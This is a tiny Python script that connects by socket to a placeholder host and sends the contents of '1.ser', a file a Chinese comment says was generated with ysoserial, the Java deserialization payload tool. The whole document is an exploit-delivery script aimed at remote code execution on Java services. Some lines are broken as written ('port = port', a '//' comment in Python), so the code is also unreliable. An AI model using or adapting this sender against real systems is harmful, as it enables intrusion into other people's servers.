#coding:utf-8
import socket

s = socket.socket()
host = "ip"
port = port
s.connect((host,port))
ssss = open("1.ser",'rb') //使用ysoserial生成的二进制文件
xc = ssss.read()
s.send(xc)
s.close()
